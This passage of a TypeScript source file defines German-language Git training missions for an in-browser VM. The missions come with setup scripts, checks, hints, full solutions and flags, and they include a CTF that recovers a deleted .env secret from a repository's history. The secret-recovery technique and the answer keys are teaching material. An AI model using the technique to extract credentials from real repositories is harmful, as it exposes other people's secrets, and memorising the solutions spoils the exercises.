        'Vor dem Commit musst du Git sagen, welche Änderungen hineingehören.',
        'Der Unterbefehl heißt `add` und bekommt den Dateinamen.',
      ],
      solution: 'git -C ~/projekt add README.md',
      failMessage: '`README.md` ist noch nicht vorgemerkt. `git status` zeigt den Stand.',
    },
    {
      id: 'commit',
      title: 'Ersten Commit erstellen',
      description: 'Erstelle den ersten Commit mit einer kurzen Nachricht deiner Wahl.',
      verify: 'git -C projekt cat-file -e HEAD:README.md 2>/dev/null',
      hints: [
        'Ein Commit hält den vorgemerkten Stand mit einer Nachricht fest.',
        'Der Unterbefehl heißt `commit`. Die Option `-m` nimmt die Nachricht direkt entgegen, sonst öffnet sich ein Editor.',
      ],
      solution: 'git -C ~/projekt commit -m "Erster Commit"',
      failMessage: 'Es gibt noch keinen Commit, der `README.md` enthält.',
    },
    {
      id: 'aendern',
      title: 'Änderung committen',
      description:
        'Hänge an `projekt/README.md` die Zeile `Git ist Versionskontrolle` an und halte die Änderung in einem zweiten Commit fest.',
      verify: `[ "$(git -C projekt rev-list --count HEAD 2>/dev/null)" -ge 2 ] && git -C projekt show HEAD:README.md | grep -qxE '[[:space:]]*Git ist Versionskontrolle[[:space:]]*'`,
      hints: [
        'Erst die Datei ändern (Editor oder `>>`), dann vormerken und committen.',
        'Für bereits bekannte Dateien gibt es beim Commit eine Abkürzung-Option, die das Vormerken übernimmt.',
      ],
      solution:
        "echo 'Git ist Versionskontrolle' >> ~/projekt/README.md && git -C ~/projekt commit -am 'README erweitert'",
      failMessage: 'Der letzte Commit muss die neue Zeile in `README.md` enthalten.',
    },
    {
      id: 'log',
      title: 'Historie auswerten',
      description:
        'Wie viele Commits hat das Repository? Schreib die Zahl in `commits.txt` in deinem Home-Verzeichnis.',
      verify: `${HELPERS}fileis commits.txt "$(git -C projekt rev-list --count HEAD)"`,
      hints: [
        'Die Historie zeigt ein Unterbefehl, dessen Name an ein Logbuch erinnert.',
        '`git log --oneline` gibt pro Commit eine Zeile aus, die du zählen oder mit `wc -l` zählen lassen kannst.',
      ],
      solution: 'git -C ~/projekt log --oneline | wc -l > ~/commits.txt',
      failMessage: 'Die Zahl in `commits.txt` passt nicht zur Anzahl der Commits.',
    },
  ],
  flag: `set -eo pipefail
h=$(git -C projekt show HEAD:README.md | tr -d '[:space:]' | sha256sum | cut -c1-12)
printf 'FLAG{git-%s}\\n' "$h"`,
};

const gitBranching: V86Mission = {
  id: 'git-branching-1',
  track: 'git',
  title: 'Git Branching',
  difficulty: 'fortgeschritten',
  durationMin: 15,
  setup: `${RESET_HOME}
${GIT_IDENTITY}
${GIT_COMMIT_HELPER}
mkdir webseite
(
  cd webseite
  git init -q -b main
  printf '<h1>Meine Seite</h1>\\n' > index.html
  printf 'body { margin: 0; }\\n' > style.css
  gitadd .
  gitc '2024-03-01T10:00:00+0000' 'Startseite anlegen'
  printf 'h1 { color: black; }\\n' >> style.css
  gitadd style.css
  gitc '2024-03-01T11:00:00+0000' 'Ueberschrift gestalten'
)
${CHOWN_HOME}`,
  steps: [
    {
      id: 'aktuell',
      title: 'Aktuellen Branch ermitteln',
      description:
        'Im Repository `webseite` liegt eine kleine Seite. Auf welchem Branch bist du gerade? Schreib den Namen in `aktuell.txt` in deinem Home-Verzeichnis.',
      verify: `${HELPERS}fileis aktuell.txt main`,
      hints: [
        'Git kennt mehrere Wege, den Branch anzuzeigen, zum Beispiel in der ersten Zeile von `git status`.',
        '`git branch` listet alle Branches, der aktuelle trägt einen Stern.',
      ],
      solution: 'git -C ~/webseite branch --show-current > ~/aktuell.txt',
      failMessage: 'Gesucht ist der Name des ausgecheckten Branches in `webseite`.',
    },
    {
      id: 'anlegen',
      title: 'Branch anlegen',
      description: 'Lege in `webseite` einen neuen Branch mit dem Namen `feature` an.',
      verify: 'git -C webseite show-ref --verify --quiet refs/heads/feature',
      hints: [
        'Branches verwaltet der Unterbefehl `branch`.',
        'Gib den Namen des neuen Branches als Argument an. Alternativ legt `checkout` oder `switch` mit einer Option an und wechselt gleich.',
      ],
      solution: 'git -C ~/webseite branch feature',
      failMessage: 'Der Branch `feature` existiert noch nicht.',
    },
    {
      id: 'wechseln',
      title: 'Branch wechseln',
      description: 'Wechsle auf den Branch `feature`.',
      verify: '[ "$(git -C webseite symbolic-ref --short -q HEAD)" = feature ]',
      hints: [
        'Wechseln heißt in Git "auschecken".',
        'Es gibt dafür `git checkout` und das neuere `git switch`.',
      ],
      solution: 'git -C ~/webseite switch feature',
      failMessage: 'Du bist noch nicht auf `feature`.',
    },
    {
      id: 'feature-commit',
      title: 'Auf dem Branch committen',
      description:
        'Lege in `webseite` die Datei `feature.txt` mit der Zeile `Neues Feature` an und committe sie auf `feature`.',
      verify: `c=$(git -C webseite log --all --format=%H -n1 -- feature.txt) && [ -n "$c" ] && git -C webseite show "$c:feature.txt" | grep -qxE '[[:space:]]*Neues Feature[[:space:]]*'`,
      hints: [
        'Zuerst die Datei anlegen, dann vormerken, dann committen.',
        'Achte darauf, dass du dabei auf dem Branch `feature` bist, nicht auf `main`.',
      ],
      solution:
        "echo 'Neues Feature' > ~/webseite/feature.txt && git -C ~/webseite add feature.txt && git -C ~/webseite commit -m 'Feature hinzufuegen'",
      failMessage: 'Es gibt noch keinen Commit, der `feature.txt` mit dem Text enthält.',
    },
    {
      id: 'zurueck',
      title: 'Zurück auf main',
      description:
        'Wechsle zurück auf `main`. Dort darf `feature.txt` noch nicht im Arbeitsverzeichnis liegen. Der Commit muss auf `feature` bleiben.',
      verify:
        '[ "$(git -C webseite symbolic-ref --short -q HEAD)" = main ] && git -C webseite cat-file -e feature:feature.txt && [ ! -e webseite/feature.txt ]',
      hints: [
        'Der Wechsel funktioniert wie vorhin, nur mit dem anderen Branch-Namen.',
        'Wenn `feature.txt` noch zu sehen ist, liegt der Commit auf dem falschen Branch.',
      ],
      solution: 'git -C ~/webseite switch main',
      failMessage:
        'Du musst auf `main` sein, und der Commit mit `feature.txt` muss auf `feature` liegen.',
    },
    {
      id: 'main-commit',
      title: 'Parallel auf main arbeiten',
      description:
        'Hänge in `webseite/style.css` eine beliebige neue Zeile an und committe sie auf `main`. Damit laufen beide Branches auseinander.',
      verify:
        '[ -n "$(git -C webseite log feature..main --format=%H -- style.css 2>/dev/null)" ] && ! git -C webseite cat-file -e main:feature.txt 2>/dev/null',
      hints: [
        'Prüfe zuerst, dass du auf `main` bist.',
        'Ändere `style.css`, merke die Änderung vor und committe. Die Abkürzung-Option von `commit` für bekannte Dateien darf helfen.',
      ],
      solution:
        "echo 'p { color: gray; }' >> ~/webseite/style.css && git -C ~/webseite commit -am 'Absatzfarbe'",
      failMessage: 'Auf `main` fehlt ein neuer Commit, der `style.css` ändert.',
    },
    {
      id: 'merge',
      title: 'Branch zusammenführen',
      description:
        'Führe `feature` in `main` zusammen. Danach muss `main` die Datei `feature.txt` enthalten.',
      verify:
        'git -C webseite merge-base --is-ancestor feature main 2>/dev/null && git -C webseite cat-file -e main:feature.txt',
      hints: [
        'Du holst die Änderungen eines anderen Branches in den aktuellen. Stelle sicher, dass du auf `main` bist.',
        'Der Unterbefehl heißt `merge`. Mit `-m` gibst du die Nachricht für den Merge-Commit direkt an, sonst öffnet sich ein Editor.',
      ],
      solution: "git -C ~/webseite merge feature -m 'Feature zusammenfuehren'",
      failMessage: '`main` enthält die Änderungen von `feature` noch nicht.',
    },
    {
      id: 'loeschen',
      title: 'Branch aufräumen',
      description: 'Lösche den Branch `feature`, der nun vollständig in `main` steckt.',
      verify:
        '! git -C webseite show-ref --verify --quiet refs/heads/feature && git -C webseite cat-file -e main:feature.txt',
      hints: [
        'Branches löscht der Unterbefehl `branch` mit einer Löschen-Option.',
        'Die kleine Variante (Buchstabe d) verweigert das Löschen, wenn der Branch nicht zusammengeführt ist.',
      ],
      solution: 'git -C ~/webseite branch -d feature',
      failMessage: 'Der Branch `feature` existiert noch, oder `main` hat `feature.txt` verloren.',
    },
  ],
  flag: `set -eo pipefail
h=$(git -C webseite show main:feature.txt | tr -d '[:space:]' | sha256sum | cut -c1-12)
printf 'FLAG{branch-%s}\\n' "$h"`,
};

const gitCtfRewind: V86Mission = {
  id: 'git-ctf-rewind',
  track: 'git',
  title: 'Git Time Machine CTF',
  difficulty: 'fortgeschritten',
  durationMin: 15,
  setup: `${RESET_HOME}
${GIT_IDENTITY}
${GIT_COMMIT_HELPER}
mkdir archiv
(
  cd archiv
  git init -q -b main
  printf '# Archiv-Tool\\n' > README.md
  printf 'host=localhost\\n' > app.conf
  gitadd .
  gitc '2024-05-02T09:00:00+0000' 'Projekt angelegt'
  printf 'API_KEY=test-key-0000\\nSECRET_TOKEN=platzhalter\\n' > .env
  gitadd .env
  gitc '2024-05-02T10:00:00+0000' 'Konfiguration fuer Tests'
  mkdir src
  printf '#!/bin/bash\\necho login\\n' > src/login.sh
  gitadd src
  gitc '2024-05-03T09:30:00+0000' 'Login-Skript'
  printf 'API_KEY=live-key-8841\\nSECRET_TOKEN=drache-7f3a91\\n' > .env
  gitadd .env
  gitc '2024-05-03T14:00:00+0000' 'Echten Token eintragen'
  git rm -q .env
  gitc '2024-05-04T08:15:00+0000' 'Zugangsdaten entfernt'
  printf 'Siehe app.conf fuer die Konfiguration.\\n' >> README.md
  gitadd README.md
  gitc '2024-05-04T09:00:00+0000' 'README aufraeumen'
)
${CHOWN_HOME}`,
  steps: [
    {
      id: 'zaehlen',
      title: 'Historie überblicken',
      description:
        'Ein Entwickler hat versehentlich ein Secret committet und die Datei später gelöscht. Im Repository `archiv` steckt es noch in der Historie. Wie viele Commits hat `main`? Schreib die Zahl in `commits.txt` in deinem Home-Verzeichnis.',
      verify: `${HELPERS}fileis commits.txt "$(git -C archiv rev-list --count main)"`,
      hints: [
        'Die Historie zeigt der Unterbefehl `log`.',
        'Mit `--oneline` wird pro Commit eine Zeile ausgegeben, die du zählen kannst.',
      ],
      solution: 'git -C ~/archiv rev-list --count main > ~/commits.txt',
      failMessage: 'Die Zahl in `commits.txt` passt nicht zur Anzahl der Commits auf `main`.',
    },
    {
      id: 'loeschcommit',
      title: 'Löschenden Commit finden',
      description:
        'Welcher Commit hat die Datei `.env` gelöscht? Schreib seinen Hash (die ersten sieben Zeichen genügen) in `loesch-commit.txt`.',
      verify: `[ -f loesch-commit.txt ] && h=$(tr -d '[:space:]' < loesch-commit.txt) && printf %s "$h" | grep -qE '^[0-9a-f]{7,40}$' && [ "$(git -C archiv rev-parse -q --verify "$h^{commit}")" = "$(git -C archiv log --diff-filter=D --format=%H -n1 -- .env)" ]`,
      hints: [
        '`git log` kann die Historie auf eine Datei einschränken, wenn du sie nach `--` angibst.',
        'Die Option `--diff-filter=D` zeigt nur Commits, die Dateien gelöscht haben. `--oneline` liefert den Kurz-Hash.',
      ],
      solution: 'git -C ~/archiv log --diff-filter=D --format=%h -- .env > ~/loesch-commit.txt',
      failMessage: 'Gesucht ist der Commit, der `.env` löscht, nicht der, der sie anlegt.',
    },
    {
      id: 'wiederherstellen',
      title: 'Datei aus der Historie holen',
      description:
        'Hole die Datei `.env` in der Version zurück ins Arbeitsverzeichnis von `archiv`, die unmittelbar vor dem Löschen aktuell war. Wechsle dafür nicht den Branch.',
      verify: `d=$(git -C archiv log --diff-filter=D --format=%H -n1 -- .env) && [ -f archiv/.env ] && git -C archiv show "$d^:.env" | cmp -s - archiv/.env`,
      hints: [
        'Der Elterncommit eines Commits lässt sich mit `^` hinter dem Hash ansprechen.',
        'Eine einzelne Datei aus einem Commit holst du mit `git checkout <Commit> -- <Datei>` oder mit `git show` und einer Umleitung.',
      ],
      solution:
        'git -C ~/archiv show "$(git -C ~/archiv log --diff-filter=D --format=%H -n1 -- .env)^:.env" > ~/archiv/.env',
      failMessage: 'Die `.env` fehlt oder stammt nicht aus dem Commit vor dem Löschen.',
    },
    {
      id: 'token',
      title: 'Secret auslesen',
      description:
        'Lies die wiederhergestellte `.env` und schreib den Wert von `SECRET_TOKEN` in `token.txt` in deinem Home-Verzeichnis.',
      verify: `${HELPERS}fileis token.txt drache-7f3a91`,
      hints: [
        'Die Datei ist versteckt, aber `cat` liest sie trotzdem, wenn du den Namen angibst.',
        'Schreib nur den Wert hinter dem Gleichheitszeichen in die Datei.',
      ],
      solution: 'grep SECRET_TOKEN ~/archiv/.env | cut -d= -f2 > ~/token.txt',
      failMessage: 'In `token.txt` muss der Wert von `SECRET_TOKEN` aus der letzten `.env` stehen.',
    },
    {
      id: 'ignore',
      title: 'Wiederholung verhindern',
      description:
        'Damit das nicht noch einmal passiert: Trage `.env` in eine `.gitignore` von `archiv` ein und committe diese. Die `.env` darf nicht von Git erfasst werden.',
      verify: `git -C archiv cat-file -e HEAD:.gitignore 2>/dev/null && git -C archiv show HEAD:.gitignore | grep -qxE '[[:space:]]*/?\\.env[[:space:]]*' && ! git -C archiv ls-files --error-unmatch .env >/dev/null 2>&1`,
      hints: [
        'Git ignoriert Dateien, deren Namen in einer Datei `.gitignore` im Repository stehen.',
        'Lege die Datei an, merke sie vor und committe sie. Hat `git checkout` die `.env` vorgemerkt, nimmt `git rm --cached` sie wieder aus dem Index. Ein Secret in der Historie gilt trotzdem als kompromittiert und müsste getauscht werden.',
      ],
      solution:
        "echo .env > ~/archiv/.gitignore && git -C ~/archiv add .gitignore && git -C ~/archiv commit -m 'env ignorieren'",
      failMessage:
        'Die `.gitignore` mit `.env` muss committet sein, und `.env` darf nicht getrackt sein.',
    },
  ],
  flag: `set -eo pipefail
printf 'FLAG{%s}\\n' "$(tr -d '[:space:]' < token.txt)"`,
};

export const v86Missions: V86Mission[] = [
  linuxBasics,
  linuxFiles,
  linuxCtfHiddenTreasure,
  linuxCtfLogDetective,
  linuxCtfPrivesc,
  gitBasics,
  gitBranching,
  gitCtfRewind,
];

export const getV86MissionById = (id: string): V86Mission | undefined =>
  v86Missions.find((m) => m.id === id);
